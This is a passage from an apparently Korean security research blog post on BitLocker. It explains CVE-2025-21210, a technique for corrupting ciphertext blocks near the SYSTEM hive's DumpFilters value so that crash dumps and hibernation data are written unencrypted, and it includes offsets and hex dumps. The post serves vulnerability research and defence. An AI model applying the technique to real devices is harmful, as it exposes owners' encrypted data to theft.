&#xC2E4;&#xD328;&#xD558;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC810;&#xC744; <a href="https://dfir.ru/wp-content/uploads/2025/01/crashxts.pdf">CrashXTS&#xB85C; &#xC54C;&#xB824;&#xC9C0;&#xB294; CVE-2025-21210</a>&#xAC00; &#xC124;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image11.png" alt></p><p>&#xC708;&#xB3C4;&#xC6B0;&#xC5D0;&#xC11C; BitLocker&#xAC00; &#xC815;&#xC0C1; &#xB7F0;&#xD0C0;&#xC784; I/O&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C;&#xB294; <code>fvevol.sys</code> &#xC2A4;&#xD0DD;&#xC744; &#xD1B5;&#xD574; &#xC139;&#xD130; &#xB2E8;&#xC704;&#xB85C; XTS-AES &#xC554;&#xBCF5;&#xD638;&#xD654;&#xAC00; &#xC801;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <strong>&#xD06C;&#xB798;&#xC2DC; &#xB364;&#xD504;/&#xD558;&#xC774;&#xBC84;&#xB124;&#xC774;&#xC158;&#xCC98;&#xB7FC; &#xC815;&#xC0C1; &#xD30C;&#xC77C;&#xC2DC;&#xC2A4;&#xD15C; &#xACBD;&#xB85C;&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xCD5C;&#xC18C; &#xB364;&#xD504; &#xC2A4;&#xD0DD;&#xC73C;&#xB85C; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC9C1;&#xC811; &#xC4F0;&#xB294; &#xD2B9;&#xC218; &#xACBD;&#xB85C;</strong>&#xC5D0;&#xC11C;&#xB294;, &#xC77C;&#xBC18; I/O &#xACBD;&#xB85C;&#xC758; &#xD544;&#xD130;&#xB4E4;&#xC774; &#xBAA8;&#xB450; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; BitLocker&#xB294; <code>dumpfve.sys</code> &#xAC19;&#xC740; &#xB364;&#xD504; &#xD544;&#xD130;&#xB97C; &#xBCC4;&#xB3C4;&#xB85C; &#xB85C;&#xB4DC;&#xD574;, &#xB364;&#xD504;/&#xD558;&#xC774;&#xBC84;&#xB124;&#xC774;&#xC158; &#xB370;&#xC774;&#xD130;&#xAC00; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xAE30;&#xB85D;&#xB420; &#xB54C;&#xB3C4; &#xC554;&#xD638;&#xD654;&#xAC00; &#xC720;&#xC9C0;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image12.png" alt></p><p>&#xC774; &#xD750;&#xB984;&#xC740; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB3C4; &#xD655;&#xC778;&#xB429;&#xB2C8;&#xB2E4;. &#xD568;&#xC218;&#xB294; <code>SYSTEM\CurrentControlSet\Control\CrashControl</code> &#xC544;&#xB798;&#xC758; DumpFilters&#xAC12;&#xC744; &#xC77D;&#xC5B4;&#xC624;&#xB294; &#xACFC;&#xC815; <code>FveGroupPolicyGetMultiSzValue()</code>&#xC744; &#xAC70;&#xCE58;&#xACE0;, &#xBAA9;&#xB85D;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xBA74;&#xC11C; <code>dumpfve.sys</code>&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4;&#xC788;&#xB294;&#xC9C0; <code>_wcsicmp()</code>&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>dumpfve.sys</code>&#xAC00; &#xC5C6;&#xAC70;&#xB098; &#xD30C;&#xC2F1;&#xC5D0; &#xC2E4;&#xD328;&#xD560; &#xACBD;&#xC6B0; &#xC989;&#xC2DC; &#xC911;&#xB2E8;&#xD558;&#xACE0;, &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC554;&#xD638;&#xD654; &#xB364;&#xD504; &#xD544;&#xD130;&#xAC00; &#xBE60;&#xC9C4; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C;&#xB294; &#xB364;&#xD504;/&#xD558;&#xC774;&#xBC84;&#xB124;&#xC774;&#xC158;&#xC744; &#xACC4;&#xC18D; &#xC9C4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xD558;&#xB294; &#xD750;&#xB984;&#xC774; &#xB098;&#xD0C0;&#xB098;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xBB38;&#xC81C;&#xB294; XTS&#xAE30;&#xBC18; &#xB514;&#xC2A4;&#xD06C; &#xC554;&#xD638;&#xD654;&#xAC00; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xC5D0;&#xC694;. XTS&#xC758; &#xC131;&#xC9C8;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xD2B9;&#xC131; &#xC554;&#xD638;&#xBB38; &#xBE14;&#xB85D;&#xC744; &#xC870;&#xC791;&#xD574; 16&#xBC14;&#xC774;&#xD2B8; &#xBE14;&#xB85D; &#xD3C9;&#xBB38;&#xC744; &#xAE68;&#xB728;&#xB9AC;&#xBA74;, &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD558;&#xC774;&#xBE0C; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; <code>DumpFilters</code> &#xC624;&#xD504;&#xC14B;&#xC774; &#xB4E4;&#xC5B4;&#xC788;&#xB294; &#xBE14;&#xB85D;&#xC744; &#xC190;&#xC0C1;&#xC2DC;&#xCF1C; &#xD30C;&#xC11C;&#xAC00; <code>DumpFilters</code> &#xC5D4;&#xD2B8;&#xB9AC;&#xB97C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD0D0;&#xC0C9;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xC0C1;&#xD0DC;&#xB97C; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC989;, &#xC774; Corrupt&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xAE30;&#xB300;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xC720;&#xB3C4;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBAA9;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image13.png" alt></p><p>&#xD654;&#xBA74;&#xC740; SYSTEM &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD558;&#xC774;&#xBE0C; &#xC548;&#xC5D0;&#xC11C; <code>ControlSet&#x2026;\Control\CrashControl</code> &#xD0A4; &#xC8FC;&#xBCC0; &#xBC14;&#xC774;&#xD2B8;&#xB97C; Hex &#xAC12;&#xC73C;&#xB85C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xC624;&#xB978;&#xCABD; ASCII &#xC601;&#xC5ED;&#xC5D0; <code>CrashControl</code>, <code>AutoReboot</code>, <code>CrashDumpEnabled</code>, <code>DumpFile</code>, <code>DumpFilters</code> &#xAC19;&#xC740; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xBCF4;&#xC774;&#xB294;&#xB370;, &#xC774;&#xAC74; <strong>&#xD0A4;/&#xAC12; &#xC774;&#xB984;</strong>&#xC774; &#xC2E4;&#xC81C; &#xD30C;&#xC77C; &#xB0B4;&#xBD80;&#xC5D0; &#xBB38;&#xC790;&#xC5F4; &#xD615;&#xD0DC;&#xB85C; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;.</p><p>XTS&#xC5D0;&#xC11C;&#xB294; &#xC554;&#xD638;&#xBB38;&#xC744; &#xC870;&#xC791;&#xD558;&#xBA74; &#xD574;&#xB2F9; 16&#xBC14;&#xC774;&#xD2B8; &#xBE14;&#xB85D;&#xC758; &#xD3C9;&#xBB38;&#xC774; &#xD1B5;&#xC81C; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xB79C;&#xB364;&#xD654;&#xB429;&#xB2C8;&#xB2E4;. &#xC989;, &#xB808;&#xC9C0;&#xC2A4;&#xD1A0;&#xB9AC; &#xD558;&#xC774;&#xBE0C; &#xAD6C;&#xC870;&#xCCB4; &#xC548;&#xC758; 4&#xBC14;&#xC774;&#xD2B8;&#xC9DC;&#xB9AC; &#xC774; &#xC624;&#xD504;&#xC14B;&#xC744; &#xB178;&#xB824;&#xC11C; &#xC774; &#xD544;&#xB4DC;&#xAC00; &#xB4E4;&#xC5B4;&#xC788;&#xB294; 16&#xBC14;&#xC774;&#xD2B8; &#xBE14;&#xB85D;&#xC744; &#xB79C;&#xB364;&#xD654;&#xD558;&#xBA74;, &#xCEE4;&#xB110; &#xC785;&#xC7A5;&#xC5D0;&#xC11C;&#xB294; <code>DumpFilters</code> &#xAC12;&#xC774; &#xC5C6;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xBA74;&#xC11C; &#xD558;&#xC774;&#xBE0C; &#xB85C;&#xB354;&#xAC00; <strong>&#xAC12; &#xBAA9;&#xB85D; &#xC704;&#xCE58;&#xB97C; &#xBABB; &#xCC3E;&#xB294; &#xC0C1;&#xD0DC;</strong>&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC6B0;&#xB9AC;&#xB294; &#xC774;&#xAC78; &#xC720;&#xB3C4;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBAA9;&#xC801;&#xC785;&#xB2C8;&#xB2E4;!</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image14.png" alt></p><p>&#xB514;&#xC2A4;&#xD06C; &#xC804;&#xCCB4;&#xB97C; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xBA74; 16&#xBC14;&#xC774;&#xD2B8; &#xBE14;&#xB85D;&#xC740; &#xC5C4;&#xCCAD;&#xB098;&#xAC8C; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. <code>DumpFilters</code>&#xB97C; &#xAE68;&#xB728;&#xB9AC;&#xAE30; &#xC704;&#xD574; &#xC218;&#xC2ED; GB &#xB514;&#xC2A4;&#xD06C;&#xC5D0;&#xC11C; &#xBB34;&#xC791;&#xC704; &#xBE14;&#xB85D;&#xC744; &#xCC0D;&#xC5B4;&#xB0BC; &#xC218;&#xB294; &#xC5C6;&#xC73C;&#xB2C8;, <code>CrashControl</code> &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xD558;&#xC774;&#xBE0C; &#xD30C;&#xC77C; &#xC624;&#xD504;&#xC14B; <code>0x13B330</code> &#xADFC;&#xCC98;&#xC5D0; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xCC3E;&#xC740; &#xB2E4;&#xC74C;, &#xADF8; &#xC8FC;&#xBCC0; &#xBA87;&#xC2ED; &#xAC1C; &#xBE14;&#xB85D;&#xB9CC; &#xD6C4;&#xBCF4;&#xB85C; &#xB450;&#xACE0; &#xD558;&#xB098;&#xC529; &#xAE68;&#xB728;&#xB824;&#xBCF4;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC0DD;&#xAC01;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. <code>CrashControl</code>&#xC774; &#xB4E4;&#xC5B4;&#xC788;&#xB294; &#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xB300;&#xB7B5; 248&#xBC14;&#xC774;&#xD2B8; &#xB5A8;&#xC5B4;&#xC9C4; &#xADFC;&#xCC98;&#xC5D0; <code>DumpFilter</code> &#xAD00;&#xB828; &#xAD6C;&#xC870;&#xAC00; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; Hex &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD588;&#xACE0;, 248&#xBC14;&#xC774;&#xD2B8;&#xB294; 16&#xBC14;&#xC774;&#xD2B8; &#xBE14;&#xB85D; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xB300;&#xB7B5; 15.5 &#xBE14;&#xB85D;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>+0xF0</code> &#xB610;&#xB294; <code>+0x100</code> &#xC8FC;&#xBCC0; &#xBE14;&#xB85D;&#xC744; &#xD6C4;&#xBCF4; &#xBE14;&#xB85D;&#xC73C;&#xB85C; &#xC7A1;&#xC544;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image15.png" alt></p><p>&#xADF8;&#xB7FC; &#xC554;&#xD638;&#xD654;&#xB41C; &#xBCFC;&#xB968; &#xC548;&#xC5D0;&#xC11C; SYSTEM &#xD558;&#xC774;&#xBE0C;&#xAC00; &#xC5B4;&#xB514;&#xC5D0; &#xC788;&#xACE0;, &#xADF8; &#xC911; <code>CrashControl</code> &#xD0A4; &#xB178;&#xB4DC;&#xAC00; &#xC5B4;&#xB514;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xB294;&#xC9C0; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;? SYSTEM &#xD558;&#xC774;&#xBE0C; &#xD30C;&#xC77C;&#xC758; &#xAC19;&#xC740; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xD074;&#xB9B0; &#xC167;&#xB2E4;&#xC6B4;, &#xAC15;&#xC81C;&#xC885;&#xB8CC;, &#xD06C;&#xB798;&#xC2DC; &#xD6C4; &#xC7AC;&#xBD80;&#xD305; &#xAC19;&#xC740; &#xC0C1;&#xD0DC;&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xBA74; &#xD2B9;&#xC815; &#xBE14;&#xB85D;&#xC774; &#xBC14;&#xB00C;&#xB294;&#xB370;, &#xC774; &#xBD80;&#xBD84;&#xC744; SYSTEM &#xD558;&#xC774;&#xBE0C; &#xC2DC;&#xC791; &#xADFC;&#xCC98;&#xC784;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; BSOD &#xC774;&#xD6C4; &#xC7AC;&#xBD80;&#xD305;&#xC744; &#xAC70;&#xCE58;&#xBA74; <code>CrashControl</code> &#xC544;&#xB798;&#xC5D0; <code>LastCrashDump</code>&#xB77C;&#xB294; &#xD2B9;&#xC815; &#xD718;&#xBC1C;&#xC131; &#xC11C;&#xBE0C;&#xD0A4;&#xAC00; &#xC0DD;&#xACBC;&#xB2E4;&#xAC00; &#xD074;&#xB9B0; &#xC885;&#xB8CC; &#xD6C4;&#xC5D0; &#xC0AC;&#xB77C;&#xC9C0;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xD574;&#xB2F9; &#xD0A4; &#xB178;&#xB4DC; &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xD544;&#xB4DC; &#xC77C;&#xBD80;&#xB9CC; &#xC608;&#xCE21; &#xAC00;&#xB2A5;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC989;, &#xD558;&#xC774;&#xBE0C; &#xC804;&#xCCB4;&#xB97C; &#xD6D1;&#xC73C;&#xBA74;&#xC11C; &#xB531; &#xADF8; &#xD328;&#xD134;&#xB300;&#xB85C; &#xBCC0;&#xD55C; &#xBE14;&#xB85D;&#xB4E4;&#xC744; <code>CrashControl</code> &#xD0A4; &#xB178;&#xB4DC;&#xB85C; &#xC0DD;&#xAC01;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><strong>&#xC815;&#xC0C1; &#xBD80;&#xD305; &#xC0C1;&#xD0DC;</strong></p><pre><code class="hljs c"><span class="hljs-function">Offset      Hex <span class="hljs-title">bytes</span> <span class="hljs-params">(<span class="hljs-number">16B</span>)</span>                                      ASCII</span>0x0056e2f0  a0 ff ff ff 6e 6b 20 00 ad 71 01 42 ed f0 da 01    ....nk ..q.B....<span class="hljs-number">0x0056e300</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> e8 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ................<span class="hljs-number">0x0056e310</span>  <span class="hljs-number">28</span> <span class="hljs-number">7b</span> <span class="hljs-number">74</span> <span class="hljs-number">00</span> ff ff ff ff <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">38</span> f4 a7 <span class="hljs-number">00</span>    ({t........<span class="hljs-number">.8</span>...<span class="hljs-number">0x0056e320</span>  <span class="hljs-number">08</span> bc <span class="hljs-number">46</span> <span class="hljs-number">00</span> ff ff ff ff <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ..F..... .......<span class="hljs-number">0x0056e330</span>  <span class="hljs-number">2</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ,..<span class="hljs-number">.0</span>...........<span class="hljs-number">0x0056e340</span>  <span class="hljs-number">43</span> <span class="hljs-number">72</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">43</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>e <span class="hljs-number">74</span> <span class="hljs-number">72</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    CrashControl....</code></pre><p><strong>&#xD06C;&#xB798;&#xC2DC;/BSOD &#xC9C1;&#xD6C4; &#xC0C1;&#xD0DC;</strong></p><pre><code class="hljs c"><span class="hljs-function">Offset      Hex <span class="hljs-title">bytes</span> <span class="hljs-params">(<span class="hljs-number">16B</span>)</span>                                      ASCII</span>0x0056e2f0  a0 ff ff ff 6e 6b 20 00 73 62 74 ab 14 f7 da 01    ....nk ..sbt.....<span class="hljs-number">0x0056e300</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> e8 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ................<span class="hljs-number">0x0056e310</span>  <span class="hljs-number">28</span> <span class="hljs-number">7b</span> <span class="hljs-number">74</span> <span class="hljs-number">00</span> c8 <span class="hljs-number">8</span>e <span class="hljs-number">01</span> <span class="hljs-number">80</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">38</span> f4 a7 <span class="hljs-number">00</span>    ({t........<span class="hljs-number">.8</span>...<span class="hljs-number">0x0056e320</span>  <span class="hljs-number">08</span> bc <span class="hljs-number">46</span> <span class="hljs-number">00</span> ff ff ff ff <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ..F..... .......<span class="hljs-number">0x0056e330</span>  <span class="hljs-number">2</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ,..<span class="hljs-number">.0</span>...........<span class="hljs-number">0x0056e340</span>  <span class="hljs-number">43</span> <span class="hljs-number">72</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">43</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>e <span class="hljs-number">74</span> <span class="hljs-number">72</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    CrashControl....</code></pre><p>&#xB450; &#xB364;&#xD504;&#xB97C; &#xBCF4;&#xBA74; &#xBA3C;&#xC800; &#xB208;&#xC5D0; &#xB744;&#xB294; &#xAC74;, &#xBB38;&#xC790;&#xC5F4; &#xC790;&#xCCB4;&#xB294; &#xC720;&#xC9C0;&#xB41C;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xB450; &#xC0C1;&#xD0DC; &#xBAA8;&#xB450; <code>0x0056e340</code> &#xB77C;&#xC778;&#xC5D0; <code>CrashControl</code> &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xB0A8;&#xC544; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, <code>CrashControl</code>&#xC774;&#xB77C;&#xB294; &#xD14D;&#xC2A4;&#xD2B8;&#xAC00; &#xC0AC;&#xB77C;&#xC838;&#xC11C; &#xBABB; &#xCC3E;&#xB294; &#xC0C1;&#xD669;&#xC774; &#xC544;&#xB2C8;&#xB77C;, <code>CrashControl</code>&#xC744; &#xAE30;&#xC220;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4; &#xB0B4;&#xBD80;&#xC758; &#xC77C;&#xBD80; &#xD544;&#xB4DC;&#xAC00; &#xBC14;&#xB00C;&#xB294; &#xD615;&#xD0DC;&#xB85C; &#xC0C1;&#xD0DC;&#xB85C;, &#xC804;&#xCCB4;&#xAC00; &#xD1B5;&#xC9F8;&#xB85C; &#xB4A4;&#xBC14;&#xB010; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC77C;&#xBD80; &#xD544;&#xB4DC;&#xB9CC; &#xC120;&#xD0DD;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB294; &#xBB34;&#xC791;&#xC704; &#xB364;&#xD504;&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xC5B4;&#xB5A4; &#xC758;&#xBBF8;&#xB97C; &#xAC16;&#xB294; &#xAD6C;&#xC870;&#xB97C; &#xBCF4;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xAC15;&#xD55C; &#xB2E8;&#xC11C;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs c"><span class="hljs-function">Offset      Hex <span class="hljs-title">bytes</span> <span class="hljs-params">(<span class="hljs-number">16B</span>)</span>                                      ASCII</span>0x00000000  9c 1e d1 7a 39 39 d4 13 0c d4 40 c5 a8 6f c4 de    ...z99....@..o..<span class="hljs-number">0x00000010</span>  e0 <span class="hljs-number">79</span> bc <span class="hljs-number">2</span>d dd <span class="hljs-number">66</span> e2 <span class="hljs-number">25</span> b0 <span class="hljs-number">48</span> <span class="hljs-number">0f</span> <span class="hljs-number">58</span> <span class="hljs-number">53</span> <span class="hljs-number">2f</span> <span class="hljs-number">06</span> <span class="hljs-number">5</span>d    .y.-.f.%.H.XS/.]<span class="hljs-number">0x00000020</span>  <span class="hljs-number">74</span> ac c3 <span class="hljs-number">51</span> <span class="hljs-number">86</span> <span class="hljs-number">9</span>e <span class="hljs-number">74</span> <span class="hljs-number">64</span> e2 d9 <span class="hljs-number">6</span>e d0 <span class="hljs-number">9</span>c <span class="hljs-number">11</span> ee <span class="hljs-number">4</span>d    t..Q..td..n....M<span class="hljs-number">0x00000030</span>  <span class="hljs-number">03</span> <span class="hljs-number">40</span> <span class="hljs-number">03</span> <span class="hljs-number">52</span> <span class="hljs-number">05</span> e0 bc <span class="hljs-number">37</span> <span class="hljs-number">41</span> c1 <span class="hljs-number">3f</span> a2 <span class="hljs-number">7</span>e <span class="hljs-number">2</span>a <span class="hljs-number">09</span> <span class="hljs-number">84</span>    .@.R..<span class="hljs-number">.7</span>A.?.~*..<span class="hljs-number">0x00000040</span>  <span class="hljs-number">24</span> <span class="hljs-number">80</span> dc b8 <span class="hljs-number">6</span>a <span class="hljs-number">20</span> c8 <span class="hljs-number">81</span> <span class="hljs-number">2</span>d c6 <span class="hljs-number">61</span> <span class="hljs-number">30</span> <span class="hljs-number">39</span> <span class="hljs-number">9f</span> <span class="hljs-number">30</span> <span class="hljs-number">51</span>    $...j ..-.a09<span class="hljs-number">.0</span>Q<span class="hljs-number">0x00000050</span>  <span class="hljs-number">31</span> <span class="hljs-number">1b</span> <span class="hljs-number">0</span>c <span class="hljs-number">74</span> <span class="hljs-number">80</span> <span class="hljs-number">96</span> <span class="hljs-number">8</span>c f2 ad <span class="hljs-number">9</span>d <span class="hljs-number">28</span> <span class="hljs-number">26</span> f9 ce <span class="hljs-number">8</span>d <span class="hljs-number">16</span>    <span class="hljs-number">1.</span>.t......(&amp;....<span class="hljs-number">0x00000060</span>  <span class="hljs-number">1</span>c <span class="hljs-number">23</span> fd d1 <span class="hljs-number">08</span> <span class="hljs-number">45</span> f0 c1 <span class="hljs-number">84</span> bb e5 <span class="hljs-number">84</span> bf b6 <span class="hljs-number">73</span> <span class="hljs-number">17</span>    .#...E........s.<span class="hljs-number">0x00000070</span>  f0 e3 <span class="hljs-number">50</span> f2 <span class="hljs-number">7</span>c <span class="hljs-number">35</span> <span class="hljs-number">7b</span> <span class="hljs-number">91</span> bd e5 <span class="hljs-number">5</span>e b3 a7 <span class="hljs-number">4</span>d <span class="hljs-number">4</span>c bf    ..P.|<span class="hljs-number">5</span>{...^..ML.<span class="hljs-number">0x00000080</span>  db f0 de <span class="hljs-number">96</span> ba <span class="hljs-number">50</span> d9 <span class="hljs-number">09</span> <span class="hljs-number">3</span>d <span class="hljs-number">83</span> b2 fb <span class="hljs-number">1</span>a f4 <span class="hljs-number">35</span> aa    .....P..=....<span class="hljs-number">.5</span>.</code></pre><pre><code class="hljs c"><span class="hljs-function">Offset      Hex <span class="hljs-title">bytes</span> <span class="hljs-params">(<span class="hljs-number">16B</span>)</span>                                      ASCII</span>0x00000000  48 49 42 52 09 00 00 00 33 c0 00 00 d8 04 00 00    HIBR....3.......<span class="hljs-number">0x00000010</span>  <span class="hljs-number">04</span> <span class="hljs-number">3</span>e <span class="hljs-number">0</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    .&gt;..............<span class="hljs-number">0x00000020</span>  <span class="hljs-number">3</span>e <span class="hljs-number">73</span> b2 <span class="hljs-number">1f</span> <span class="hljs-number">2b</span> f7 da <span class="hljs-number">01</span> <span class="hljs-number">3</span>e <span class="hljs-number">1</span>d <span class="hljs-number">07</span> <span class="hljs-number">2</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    &gt;s..+...&gt;..*....<span class="hljs-number">0x00000030</span>  ff bd <span class="hljs-number">9b</span> bd <span class="hljs-number">7f</span> a4 <span class="hljs-number">5f</span> <span class="hljs-number">06</span> <span class="hljs-number">01</span> ca <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ......_.........<span class="hljs-number">0x00000040</span>  <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">44</span> a8 <span class="hljs-number">80</span> c2 ff ff 